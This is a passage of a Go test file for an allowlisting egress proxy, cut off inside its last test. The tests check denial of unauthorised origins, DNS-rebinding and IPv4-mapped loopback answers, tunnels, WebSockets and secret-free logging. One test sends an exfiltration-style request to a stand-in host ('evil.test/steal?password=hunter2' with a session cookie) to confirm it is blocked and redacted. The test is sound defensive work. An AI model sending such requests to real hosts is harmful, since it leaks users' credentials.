package egress

import (
	"bufio"
	"context"
	"crypto/sha1"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/xtrcom/xt-nichrome/internal/policy"
)

// --- helpers ---------------------------------------------------------------

func mustPolicy(t *testing.T, specs []string, allowPrivate bool) *policy.Policy {
	t.Helper()
	pol, err := policy.New(specs, allowPrivate)
	if err != nil {
		t.Fatalf("policy.New(%v): %v", specs, err)
	}
	return pol
}

func mustProxy(t *testing.T, opts Options) *Proxy {
	t.Helper()
	p, err := New(opts)
	if err != nil {
		t.Fatalf("egress.New: %v", err)
	}
	p.Start()
	t.Cleanup(func() { _ = p.Close() })
	return p
}

// proxyFunc returns the http.Transport.Proxy hook that points a client at p.
func proxyFunc(t *testing.T, p *Proxy) func(*http.Request) (*url.URL, error) {
	t.Helper()
	u, err := url.Parse(p.URL())
	if err != nil {
		t.Fatalf("url.Parse(%q): %v", p.URL(), err)
	}
	return http.ProxyURL(u)
}

func originSpec(rawURL string) string {
	u, err := url.Parse(rawURL)
	if err != nil {
		return ""
	}
	return "http://" + u.Host
}

func hostPort(t *testing.T, rawURL string) string {
	t.Helper()
	u, err := url.Parse(rawURL)
	if err != nil {
		t.Fatalf("url.Parse(%q): %v", rawURL, err)
	}
	return u.Host
}

// rawConnect sends a CONNECT line to the proxy and returns the parsed response
// plus the still-open conn (caller closes) and its reader.
func rawConnect(t *testing.T, p *Proxy, authority string) (*http.Response, net.Conn, *bufio.Reader) {
	t.Helper()
	conn, err := net.Dial("tcp", p.Addr())
	if err != nil {
		t.Fatalf("dial proxy: %v", err)
	}
	t.Cleanup(func() { _ = conn.Close() })
	if _, err := fmt.Fprintf(conn, "CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", authority, authority); err != nil {
		t.Fatalf("write CONNECT: %v", err)
	}
	_ = conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	br := bufio.NewReader(conn)
	resp, err := http.ReadResponse(br, &http.Request{Method: http.MethodConnect})
	if err != nil {
		t.Fatalf("read CONNECT response: %v", err)
	}
	return resp, conn, br
}

func readAll(t *testing.T, r io.Reader) string {
	t.Helper()
	b, err := io.ReadAll(r)
	if err != nil {
		t.Fatalf("read body: %v", err)
	}
	return string(b)
}

// --- DNS stub --------------------------------------------------------------
//
// A minimal UDP DNS server so tests can hand the proxy a chosen answer without
// touching /etc/hosts or the real resolver. Only A/AAAA are served; anything
// else gets a NODATA reply (RCODE 0, no answers), which Go treats as "no
// records for this family" rather than an error.

type dnsStub struct {
	pc      net.PacketConn
	addr    string
	mu      sync.Mutex
	records map[string]map[uint16][]net.IP // qtype -> addresses
}

const (
	dnsTypeA    uint16 = 1
	dnsTypeAAAA uint16 = 28
)

func newDNSStub(t *testing.T) *dnsStub {
	t.Helper()
	pc, err := net.ListenPacket("udp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("dns stub listen: %v", err)
	}
	d := &dnsStub{pc: pc, addr: pc.LocalAddr().String(), records: map[string]map[uint16][]net.IP{}}
	go d.serve()
	t.Cleanup(func() { _ = pc.Close() })
	return d
}

func (d *dnsStub) add(t *testing.T, name string, qtype uint16, ipLiteral string) {
	t.Helper()
	ip := net.ParseIP(ipLiteral)
	if ip == nil {
		t.Fatalf("bad stub ip %q", ipLiteral)
	}
	d.mu.Lock()
	defer d.mu.Unlock()
	name = strings.ToLower(strings.TrimSuffix(name, "."))
	if d.records[name] == nil {
		d.records[name] = map[uint16][]net.IP{}
	}
	d.records[name][qtype] = append(d.records[name][qtype], ip)
}

// resolver returns a *net.Resolver whose queries are answered by this stub.
func (d *dnsStub) resolver() *net.Resolver {
	return &net.Resolver{
		PreferGo: true,
		Dial: func(_ context.Context, network, _ string) (net.Conn, error) {
			if network != "udp" && network != "udp4" {
				return nil, fmt.Errorf("dns stub: unsupported network %q", network)
			}
			return net.Dial("udp", d.addr)
		},
	}
}

func (d *dnsStub) serve() {
	buf := make([]byte, 1500)
	for {
		n, from, err := d.pc.ReadFrom(buf)
		if err != nil {
			return
		}
		if resp := d.answer(buf[:n]); resp != nil {
			_, _ = d.pc.WriteTo(resp, from)
		}
	}
}

func (d *dnsStub) answer(req []byte) []byte {
	if len(req) < 12 {
		return nil
	}
	name, qtype, qend, ok := parseQuestion(req)
	if !ok {
		return nil
	}

	d.mu.Lock()
	ips := append([]net.IP(nil), d.records[name][qtype]...)
	d.mu.Unlock()

	var answers []byte
	count := 0
	for _, ip := range ips {
		var rdata []byte
		switch qtype {
		case dnsTypeA:
			if v4 := ip.To4(); v4 != nil {
				rdata = v4
			}
		case dnsTypeAAAA:
			rdata = ip.To16()
		}
		if rdata == nil {
			continue
		}
		answers = append(answers, encodeRR(qtype, rdata)...)
		count++
	}

	resp := make([]byte, 0, 12+qend-12+len(answers))
	resp = append(resp, req[0], req[1]) // ID
	resp = append(resp, 0x81, 0x80)     // QR, RD, RA, RCODE 0
	resp = append(resp, 0x00, 0x01)     // QDCOUNT
	resp = append(resp, byte(count>>8), byte(count))
	resp = append(resp, 0x00, 0x00, 0x00, 0x00) // NSCOUNT, ARCOUNT
	resp = append(resp, req[12:qend]...)
	resp = append(resp, answers...)
	return resp
}

func parseQuestion(req []byte) (string, uint16, int, bool) {
	i := 12
	var labels []string
	for {
		if i >= len(req) {
			return "", 0, 0, false
		}
		l := int(req[i])
		i++
		if l == 0 {
			break
		}
		if l&0xC0 != 0 || i+l > len(req) {
			return "", 0, 0, false
		}
		labels = append(labels, string(req[i:i+l]))
		i += l
	}
	if i+4 > len(req) {
		return "", 0, 0, false
	}
	qtype := binary.BigEndian.Uint16(req[i:])
	return strings.ToLower(strings.Join(labels, ".")), qtype, i + 4, true
}

func encodeRR(qtype uint16, rdata []byte) []byte {
	b := make([]byte, 0, 12+len(rdata))
	b = append(b, 0xC0, 0x0C) // pointer to the question name
	b = binary.BigEndian.AppendUint16(b, qtype)
	b = binary.BigEndian.AppendUint16(b, 1) // class IN
	b = append(b, 0, 0, 0, 60)              // TTL
	b = binary.BigEndian.AppendUint16(b, uint16(len(rdata)))
	return append(b, rdata...)
}

// --- tests -----------------------------------------------------------------

func TestAllowedPlainHTTP(t *testing.T) {
	var hits atomic.Int64
	origin := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		hits.Add(1)
		fmt.Fprintf(w, "hello-through-proxy path=%s", r.URL.Path)
	}))
	defer origin.Close()

	pol := mustPolicy(t, []string{"http://" + hostPort(t, origin.URL)}, true)
	p := mustProxy(t, Options{Policy: pol})

	client := &http.Client{
		Transport: &http.Transport{Proxy: proxyFunc(t, p)},
		Timeout:   10 * time.Second,
	}
	resp, err := client.Get(origin.URL + "/hello")
	if err != nil {
		t.Fatalf("GET through proxy: %v", err)
	}
	defer func() { _ = resp.Body.Close() }()
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("status = %d, want 200 (body %q)", resp.StatusCode, readAll(t, resp.Body))
	}
	body := readAll(t, resp.Body)
	if !strings.Contains(body, "hello-through-proxy") || !strings.Contains(body, "path=/hello") {
		t.Fatalf("body = %q, want origin body echoed with rewritten origin-form path", body)
	}
	if got := hits.Load(); got != 1 {
		t.Fatalf("origin hits = %d, want 1", got)
	}
	if got := p.Stats().Allowed; got != 1 {
		t.Fatalf("Stats().Allowed = %d, want 1", got)
	}
	if got := p.Stats().Denied; got != 0 {
		t.Fatalf("Stats().Denied = %d, want 0", got)
	}
}

func TestDeniedOriginNeverDials(t *testing.T) {
	allowed := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprint(w, "allowed-origin")
	}))
	defer allowed.Close()

	var deniedHits atomic.Int64
	forbidden := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		deniedHits.Add(1)
		fmt.Fprint(w, "must-not-be-reached")
	}))
	defer forbidden.Close()

	// Only the first origin is authorized.
	pol := mustPolicy(t, []string{"http://" + hostPort(t, allowed.URL)}, true)
	p := mustProxy(t, Options{Policy: pol})

	client := &http.Client{
		Transport: &http.Transport{Proxy: proxyFunc(t, p)},
		Timeout:   10 * time.Second,
	}
	resp, err := client.Get(forbidden.URL + "/secret")
	if err != nil {
		t.Fatalf("GET via proxy: %v", err)
	}
	defer func() { _ = resp.Body.Close() }()

	if resp.StatusCode != http.StatusForbidden {
		t.Fatalf("status = %d, want 403", resp.StatusCode)
	}
	body := readAll(t, resp.Body)
	if !strings.HasPrefix(body, "egress: ") {
		t.Fatalf("body = %q, want the \"egress: <reason>\" form", body)
	}
	if got := deniedHits.Load(); got != 0 {
		t.Fatalf("denied origin hits = %d, want 0 (denial must never dial)", got)
	}
	st := p.Stats()
	if st.Denied != 1 || st.Allowed != 0 {
		t.Fatalf("Stats = %+v, want Denied=1 Allowed=0", st)
	}
}

func TestConnectTunnelToTLSFixture(t *testing.T) {
	origin := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprint(w, "tls-through-connect")
	}))
	defer origin.Close()

	// scheme http: a rule authorizes CONNECT on the rule's port; the policy
	// derives https only from port 443.
	pol := mustPolicy(t, []string{"http://" + hostPort(t, origin.URL)}, true)
	p := mustProxy(t, Options{Policy: pol})

	client := &http.Client{
		Transport: &http.Transport{
			Proxy:           proxyFunc(t, p),
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: 10 * time.Second,
	}
	resp, err := client.Get(origin.URL + "/tls")
	if err != nil {
		t.Fatalf("GET through CONNECT: %v", err)
	}
	defer func() { _ = resp.Body.Close() }()
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("status = %d, want 200", resp.StatusCode)
	}
	if body := readAll(t, resp.Body); body != "tls-through-connect" {
		t.Fatalf("body = %q, want %q", body, "tls-through-connect")
	}
	if got := p.Stats().Allowed; got != 1 {
		t.Fatalf("Stats().Allowed = %d, want 1", got)
	}
}

func TestConnectNameResolvingToLoopbackDenied(t *testing.T) {
	dns := newDNSStub(t)
	dns.add(t, "rebind.test", dnsTypeA, "127.0.0.1")

	// The NAME is authorized, the address it resolves to is not.
	pol := mustPolicy(t, []string{"http://rebind.test:80"}, false)
	p := mustProxy(t, Options{Policy: pol, Resolver: dns.resolver()})

	resp, _, _ := rawConnect(t, p, "rebind.test:80")
	defer func() { _ = resp.Body.Close() }()
	if resp.StatusCode != http.StatusForbidden {
		t.Fatalf("status = %d, want 403 (name authorized, address prohibited)", resp.StatusCode)
	}
	body := readAll(t, resp.Body)
	if !strings.Contains(body, "prohibited") {
		t.Fatalf("body = %q, want a prohibited-address reason", body)
	}
	st := p.Stats()
	if st.Denied != 1 || st.Allowed != 0 {
		t.Fatalf("Stats = %+v, want Denied=1 Allowed=0", st)
	}
}

func TestMixedAnswerDenied(t *testing.T) {
	// One publicly routable address and one unique-local address in the same
	// answer. Both are IPv6 because the dependency currently reports every IPv4
	// address as prohibited (see the report to the Lead), which would make an
	// IPv4-based mixture pass for the wrong reason.
	dns := newDNSStub(t)
	dns.add(t, "mixed.test", dnsTypeAAAA, "2606:4700:4700::1111")
	dns.add(t, "mixed.test", dnsTypeAAAA, "fd00::1")

	pol := mustPolicy(t, []string{"http://mixed.test:80"}, false)
	p := mustProxy(t, Options{Policy: pol, Resolver: dns.resolver()})

	resp, _, _ := rawConnect(t, p, "mixed.test:80")
	defer func() { _ = resp.Body.Close() }()
	if resp.StatusCode != http.StatusForbidden {
		t.Fatalf("status = %d, want 403: a permitted address must not be cherry-picked out of a mixed answer", resp.StatusCode)
	}
	body := readAll(t, resp.Body)
	if !strings.Contains(body, "fd00::1") {
		t.Fatalf("body = %q, want the prohibited address fd00::1 named", body)
	}
	if got := p.Stats().Allowed; got != 0 {
		t.Fatalf("Stats().Allowed = %d, want 0", got)
	}
}

func TestIPv4MappedIPv6Denied(t *testing.T) {
	dns := newDNSStub(t)
	dns.add(t, "mapped.test", dnsTypeAAAA, "::ffff:127.0.0.1")

	pol := mustPolicy(t, []string{"http://mapped.test:80"}, false)
	p := mustProxy(t, Options{Policy: pol, Resolver: dns.resolver()})

	resp, _, _ := rawConnect(t, p, "mapped.test:80")
	defer func() { _ = resp.Body.Close() }()
	if resp.StatusCode != http.StatusForbidden {
		t.Fatalf("status = %d, want 403 for ::ffff:127.0.0.1", resp.StatusCode)
	}
	body := readAll(t, resp.Body)
	if !strings.Contains(body, "127.0.0.1") {
		t.Fatalf("body = %q, want the normalized IPv4 form in the reason", body)
	}
	if strings.Contains(body, "::ffff") {
		t.Fatalf("body = %q, want NormalizeIP applied (no 16-byte form)", body)
	}
}

func TestWebSocketUpgradeEcho(t *testing.T) {
	const wantPayload = "ping-through-proxy"
	origin := httptest.NewServer(http.HandlerFunc(serveWSEcho))
	defer origin.Close()

	pol := mustPolicy(t, []string{"http://" + hostPort(t, origin.URL)}, true)
	p := mustProxy(t, Options{Policy: pol})

	conn, err := net.Dial("tcp", p.Addr())
	if err != nil {
		t.Fatalf("dial proxy: %v", err)
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(10 * time.Second))

	const wsKey = "dGhlIHNhbXBsZSBub25jZQ=="
	req := "GET " + origin.URL + "/ws HTTP/1.1\r\n" +
		"Host: " + hostPort(t, origin.URL) + "\r\n" +
		"Upgrade: websocket\r\n" +
		"Connection: Upgrade\r\n" +
		"Sec-WebSocket-Key: " + wsKey + "\r\n" +
		"Sec-WebSocket-Version: 13\r\n\r\n"
	if _, err := io.WriteString(conn, req); err != nil {
		t.Fatalf("write handshake: %v", err)
	}

	br := bufio.NewReader(conn)
	resp, err := http.ReadResponse(br, &http.Request{Method: http.MethodGet})
	if err != nil {
		t.Fatalf("read 101: %v", err)
	}
	if resp.StatusCode != http.StatusSwitchingProtocols {
		t.Fatalf("status = %d, want 101", resp.StatusCode)
	}
	if got := resp.Header.Get("Sec-WebSocket-Accept"); got == "" {
		t.Fatalf("101 lacks Sec-WebSocket-Accept; headers = %v", resp.Header)
	}

	if err := writeClientFrame(conn, 0x1, []byte(wantPayload)); err != nil {
		t.Fatalf("write frame: %v", err)
	}
	opcode, payload, err := readServerFrame(br)
	if err != nil {
		t.Fatalf("read echo frame: %v", err)
	}
	if opcode != 0x1 {
		t.Fatalf("opcode = %#x, want 0x1 (text)", opcode)
	}
	if string(payload) != wantPayload {
		t.Fatalf("echoed payload = %q, want %q", payload, wantPayload)
	}

	// The recorded decision is an http event on the ws scheme.
	stats := p.Stats()
	if stats.Allowed != 1 {
		t.Fatalf("Stats().Allowed = %d, want 1", stats.Allowed)
	}
}

func TestCloseDuringActiveTunnel(t *testing.T) {
	// An origin that accepts and then holds the connection open.
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("listen holder: %v", err)
	}
	defer func() { _ = ln.Close() }()

	var (
		mu    sync.Mutex
		held  []net.Conn
		ready = make(chan struct{})
	)
	var once sync.Once
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			mu.Lock()
			held = append(held, c)
			mu.Unlock()
			once.Do(func() { close(ready) })
		}
	}()
	t.Cleanup(func() {
		mu.Lock()
		for _, c := range held {
			_ = c.Close()
		}
		mu.Unlock()
	})

	pol := mustPolicy(t, []string{"http://" + ln.Addr().String()}, true)
	p := mustProxy(t, Options{Policy: pol})

	resp, _, _ := rawConnect(t, p, ln.Addr().String())
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("CONNECT status = %d, want 200", resp.StatusCode)
	}
	select {
	case <-ready:
	case <-time.After(5 * time.Second):
		t.Fatal("origin never accepted the tunnel")
	}

	if got := waitFor(t, func() bool { return p.Stats().ActiveConns > 0 }, 5*time.Second); !got {
		t.Fatalf("ActiveConns never became positive; stats = %+v", p.Stats())
	}

	done := make(chan error, 1)
	go func() { done <- p.Close() }()
	select {
	case err := <-done:
		if err != nil {
			t.Fatalf("Close() = %v, want nil", err)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("Close() blocked with an active tunnel")
	}

	if !waitFor(t, func() bool { return p.Stats().ActiveConns == 0 }, 5*time.Second) {
		t.Fatalf("ActiveConns = %d after Close, want 0", p.Stats().ActiveConns)
	}
}

func TestMalformedRequests(t *testing.T) {
	pol := mustPolicy(t, []string{"http://allowed.test:80"}, true)
	p := mustProxy(t, Options{Policy: pol})

	cases := []struct{ name, line string }{
		{"no port", "CONNECT allowed.test HTTP/1.1"},
		{"port zero", "CONNECT allowed.test:0 HTTP/1.1"},
		{"port too large", "CONNECT allowed.test:70000 HTTP/1.1"},
		{"non numeric port", "CONNECT allowed.test:abc HTTP/1.1"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			conn, err := net.Dial("tcp", p.Addr())
			if err != nil {
				t.Fatalf("dial proxy: %v", err)
			}
			defer func() { _ = conn.Close() }()
			_ = conn.SetDeadline(time.Now().Add(10 * time.Second))
			if _, err := fmt.Fprintf(conn, "%s\r\nHost: allowed.test\r\n\r\n", tc.line); err != nil {
				t.Fatalf("write: %v", err)
			}
			resp, err := http.ReadResponse(bufio.NewReader(conn), &http.Request{Method: http.MethodConnect})
			if err != nil {
				t.Fatalf("read response: %v", err)
			}
			defer func() { _ = resp.Body.Close() }()
			if resp.StatusCode != http.StatusBadRequest {
				t.Fatalf("status = %d, want 400", resp.StatusCode)
			}
		})
	}
}

func TestForwardStreamsBodyAndStripsHopByHop(t *testing.T) {
	const payload = "streamed-request-body"

	var (
		mu       sync.Mutex
		gotBody  string
		gotHdrs  http.Header
		gotQuery string
		gotVia   string
		gotMeth  string
	)
	origin := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, err := io.ReadAll(r.Body)
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		mu.Lock()
		gotBody, gotHdrs, gotQuery = string(b), r.Header.Clone(), r.URL.RawQuery
		gotVia, gotMeth = r.Header.Get("Via"), r.Method
		mu.Unlock()
		fmt.Fprint(w, "accepted")
	}))
	defer origin.Close()

	var events []Event
	var evMu sync.Mutex
	pol := mustPolicy(t, []string{"http://" + hostPort(t, origin.URL)}, true)
	p := mustProxy(t, Options{
		Policy: pol,
		Log: func(ev Event) {
			evMu.Lock()
			events = append(events, ev)
			evMu.Unlock()
		},
	})

	req, err := http.NewRequest(http.MethodPost, origin.URL+"/submit?token=super-secret&q=1", strings.NewReader(payload))
	if err != nil {
		t.Fatalf("NewRequest: %v", err)
	}
	req.Header.Set("X-Test", "kept")
	req.Header.Set("Proxy-Connection", "keep-alive")
	req.Header.Set("Keep-Alive", "timeout=5")
	req.Header.Set("Cookie", "session=private-cookie-value")
	client := &http.Client{
		Transport: &http.Transport{Proxy: proxyFunc(t, p)},
		Timeout:   10 * time.Second,
	}
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("POST through proxy: %v", err)
	}
	defer func() { _ = resp.Body.Close() }()
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("status = %d, want 200 (body %q)", resp.StatusCode, readAll(t, resp.Body))
	}
	if body := readAll(t, resp.Body); body != "accepted" {
		t.Fatalf("body = %q, want %q", body, "accepted")
	}

	mu.Lock()
	defer mu.Unlock()
	if gotMeth != http.MethodPost {
		t.Fatalf("origin method = %q, want POST preserved", gotMeth)
	}
	if gotBody != payload {
		t.Fatalf("origin body = %q, want %q", gotBody, payload)
	}
	if gotQuery != "token=super-secret&q=1" {
		t.Fatalf("origin query = %q, want it preserved", gotQuery)
	}
	if gotVia != viaToken {
		t.Fatalf("origin Via = %q, want %q", gotVia, viaToken)
	}
	if gotHdrs.Get("X-Test") != "kept" {
		t.Fatalf("end-to-end header lost: %v", gotHdrs)
	}
	for _, banned := range []string{"Proxy-Connection", "Keep-Alive", "Proxy-Authorization"} {
		if gotHdrs.Get(banned) != "" {
			t.Fatalf("hop-by-hop header %q reached the origin: %v", banned, gotHdrs)
		}
	}

	// The Event must not leak the query string or any cookie material.
	evMu.Lock()
	defer evMu.Unlock()
	if len(events) != 1 {
		t.Fatalf("events = %d, want 1: %+v", len(events), events)
	}
	ev := events[0]
	// Event.Host is the hostname only; the port is a separate field.
	if wantHost, wantPort := splitHostPortForTest(t, origin.URL); ev.Host != wantHost || ev.Port != wantPort {
		t.Fatalf("Event host:port = %q:%d, want %q:%d", ev.Host, ev.Port, wantHost, wantPort)
	}
	rendered := fmt.Sprintf("%+v", ev)
	for _, secret := range []string{"super-secret", "private-cookie-value", "token="} {
		if strings.Contains(rendered, secret) {
			t.Fatalf("Event leaked %q: %s", secret, rendered)
		}
	}
	if ev.Kind != "http" || ev.Method != http.MethodPost || !ev.Allowed || ev.Status != 200 {
		t.Fatalf("Event = %+v, want kind=http method=POST allowed=true status=200", ev)
	}
}

func TestDeniedEventIsSanitized(t *testing.T) {
	allowed := httptest.NewServer(http.HandlerFunc(func(http.ResponseWriter, *http.Request) {}))
	defer allowed.Close()

	var events []Event
	var mu sync.Mutex
	pol := mustPolicy(t, []string{"http://" + hostPort(t, allowed.URL)}, true)
	p := mustProxy(t, Options{
		Policy: pol,
		Log: func(ev Event) {
			mu.Lock()
			events = append(events, ev)
			mu.Unlock()
		},
	})

	conn, err := net.Dial("tcp", p.Addr())
	if err != nil {
		t.Fatalf("dial proxy: %v", err)
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(10 * time.Second))
	// An absolute-URI request to an unauthorized origin, with a secret in both
	// the query string and a cookie.
	if _, err := fmt.Fprintf(conn, "GET http://evil.test/steal?password=hunter2 HTTP/1.1\r\nHost: evil.test\r\nCookie: sid=topsecret\r\n\r\n"); err != nil {
		t.Fatalf("write: %v", err)
	}
	resp, err := http.ReadResponse(bufio.NewReader(conn), &http.Request{Method: http.MethodGet})
	if err != nil {
		t.Fatalf("read response: %v", err)
	}
	defer func() { _ = resp.Body.Close() }()
	if resp.StatusCode != http.StatusForbidden {
		t.Fatalf("status = %d, want 403", resp.StatusCode)
	}

	mu.Lock()
	defer mu.Unlock()
	if len(events) != 1 {
		t.Fatalf("events = %d, want 1: %+v", len(events), events)
	}
	ev := events[0]
	if ev.Allowed || ev.Kind != "denied" {
		t.Fatalf("Event = %+v, want kind=denied allowed=false", ev)
	}
	if ev.Host != "evil.test" {
		t.Fatalf("Event.Host = %q, want %q with no path or query", ev.Host, "evil.test")
	}
	rendered := fmt.Sprintf("%+v", ev)
	for _, secret := range []string{"hunter2", "topsecret", "password="} {
		if strings.Contains(rendered, secret) {
			t.Fatalf("Event leaked %q: %s", secret, rendered)
		}
	}
}

func TestDialFailureIs502(t *testing.T) {
	// Reserve then release a port so nothing is listening on it.
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("reserve port: %v", err)
	}
	deadAddr := ln.Addr().String()
	_ = ln.Close()

	// allowPrivate=true so the address-range check passes and the failure is
	// genuinely the dial, not the policy.
	pol := mustPolicy(t, []string{"http://" + deadAddr}, true)
	p := mustProxy(t, Options{Policy: pol, DialTimeout: 2 * time.Second})

	resp, _, _ := rawConnect(t, p, deadAddr)
	defer func() { _ = resp.Body.Close() }()
	if resp.StatusCode != http.StatusBadGateway {
		t.Fatalf("status = %d, want 502", resp.StatusCode)
	}
	if body := readAll(t, resp.Body); !strings.HasPrefix(body, "egress: ") {
		t.Fatalf("body = %q, want the \"egress: <reason>\" form", body)
	}
	st := p.Stats()
	if st.Errors != 1 || st.Allowed != 0 || st.Denied != 0 {
		t.Fatalf("Stats = %+v, want Errors=1 Allowed=0 Denied=0", st)
	}
}

func TestCloseIsIdempotent(t *testing.T) {
	pol := mustPolicy(t, []string{"http://allowed.test:80"}, true)
	p, err := New(Options{Policy: pol})
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	p.Start()
	for i := 0; i < 3; i++ {
		if err := p.Close(); err != nil {
			t.Fatalf("Close() #%d = %v, want nil", i+1, err)
		}
	}
	// A kill must stop accepting. Dial until refused rather than once: a SYN
	// already in the kernel backlog can still complete a handshake right after
	// the listener closes, and that conn is never accepted.
	if !waitFor(t, func() bool {
		c, err := net.DialTimeout("tcp", p.Addr(), 250*time.Millisecond)
		if err != nil {
			return true
		}
		_ = c.Close()
		return false
	}, 5*time.Second) {
		t.Fatal("listener still accepting after Close")
	}
}

func TestHeadAndNoContentResponses(t *testing.T) {
	origin := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/nocontent":
			w.WriteHeader(http.StatusNoContent)
		case "/empty":
			w.Header().Set("Content-Length", "0")
			w.WriteHeader(http.StatusOK)
		default:
			w.Header().Set("Content-Type", "text/plain")
			fmt.Fprint(w, "eleven-bytes")
		}
	}))
	defer origin.Close()

	pol := mustPolicy(t, []string{"http://" + hostPort(t, origin.URL)}, true)
	p := mustProxy(t, Options{Policy: pol})
	client := &http.Client{
		Transport: &http.Transport{Proxy: proxyFunc(t, p)},
		Timeout:   10 * time.Second,
	}

	// HEAD must report the entity length but carry no body, or the client blocks
	// waiting for bytes that will never come.
	resp, err := client.Head(origin.URL + "/text")
	if err != nil {
		t.Fatalf("HEAD through proxy: %v", err)
	}
	_ = resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("HEAD status = %d, want 200", resp.StatusCode)
	}
	if got := resp.ContentLength; got != int64(len("eleven-bytes")) {
		t.Fatalf("HEAD Content-Length = %d, want %d", got, len("eleven-bytes"))
	}

	for _, path := range []string{"/nocontent", "/empty"} {
		resp, err := client.Get(origin.URL + path)
		if err != nil {
			t.Fatalf("GET %s through proxy: %v", path, err)
		}
		body, err := io.ReadAll(resp.Body)
		_ = resp.Body.Close()
		if err != nil {
			t.Fatalf("GET %s body: %v", path, err)
		}
		if len(body) != 0 {
			t.Fatalf("GET %s body = %q, want empty", path, body)
		}
	}
}

func TestByteCounters(t *testing.T) {
	const payload = "0123456789abcdef"
	origin := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = io.ReadAll(r.Body)
		fmt.Fprint(w, payload)
	}))
	defer origin.Close()

	pol := mustPolicy(t, []string{"http://" + hostPort(t, origin.URL)}, true)
	p := mustProxy(t, Options{Policy: pol})

	client := &http.Client{
		Transport: &http.Transport{Proxy: proxyFunc(t, p)},
		Timeout:   10 * time.Second,
	}
	resp, err := client.Post(origin.URL+"/count", "text/plain", strings.NewReader(payload))
	if err != nil {
		t.Fatalf("POST through proxy: %v", err)
	}
	defer func() { _ = resp.Body.Close() }()
	if body := readAll(t, resp.Body); body != payload {
		t.Fatalf("body = %q, want %q", body, payload)
	}

	st := p.Stats()
	if st.BytesDown < int64(len(payload)) {
		t.Fatalf("BytesDown = %d, want >= %d", st.BytesDown, len(payload))
	}
	if st.BytesUp < int64(len(payload)) {
		t.Fatalf("BytesUp = %d, want >= %d", st.BytesUp, len(payload))
	}
}

func TestBracketedIPv6CONNECT(t *testing.T) {
	// A loopback IPv6 origin reached through a bracketed CONNECT authority.
	ln, err := net.Listen("tcp", "[::1]:0")
	if err != nil {
		t.Skipf("no IPv6 loopback available: %v", err)
	}
	defer func() { _ = ln.Close() }()
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			_, _ = c.Write([]byte("v6-ok"))
			_ = c.Close()
		}
	}()

	_, portStr, err := net.SplitHostPort(ln.Addr().String())
	if err != nil {
		t.Fatalf("SplitHostPort: %v", err)
	}
	pol := mustPolicy(t, []string{"http://[::1]:" + portStr}, true)
	p := mustProxy(t, Options{Policy: pol})

	resp, conn, br := rawConnect(t, p, "[::1]:"+portStr)
	defer func() { _ = resp.Body.Close() }()
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("status = %d, want 200 for a bracketed IPv6 authority", resp.StatusCode)
	}
	if got := readAll(t, br); got != "v6-ok" {
		t.Fatalf("tunnel payload = %q, want %q", got, "v6-ok")
	}
	_ = conn.Close()
}

func TestConcurrentRequestsRaceClean(t *testing.T) {
	origin := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprintf(w, "ok:%s", r.URL.Path)
	}))
	defer origin.Close()

	pol := mustPolicy(t, []string{"http://" + hostPort(t, origin.URL)}, true)
	p := mustProxy(t, Options{Policy: pol})
	transport := &http.Transport{Proxy: proxyFunc(t, p), MaxConnsPerHost: 8}
	client := &http.Client{
		Transport: transport,
		Timeout:   20 * time.Second,
	}

	const n = 24
	var wg sync.WaitGroup
	errs := make(chan error, n)
	for i := 0; i < n; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			path := fmt.Sprintf("/req-%d", i)
			resp, err := client.Get(origin.URL + path)
			if err != nil {
				errs <- err
				return
			}
			defer func() { _ = resp.Body.Close() }()
			b, err := io.ReadAll(resp.Body)
			if err != nil {
				errs <- err
				return
			}
			if string(b) != "ok:"+path {
				errs <- fmt.Errorf("body = %q, want %q", b, "ok:"+path)
			}
		}(i)
	}
	wg.Wait()
	close(errs)
	for err := range errs {
		t.Fatalf("concurrent request failed: %v", err)
	}
	if got := p.Stats().Allowed; got != n {
		t.Fatalf("Stats().Allowed = %d, want %d", got, n)
	}
	// Idle keep-alive conns are legitimately still open; drop them, then the
	// gauge must fall to zero on its own (no connection goroutine survives).
	transport.CloseIdleConnections()
	if !waitFor(t, func() bool { return p.Stats().ActiveConns == 0 }, 5*time.Second) {
		t.Fatalf("ActiveConns = %d after idle conns closed, want 0", p.Stats().ActiveConns)
	}
}

func TestConnRegistryDoesNotGrow(t *testing.T) {
	origin := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
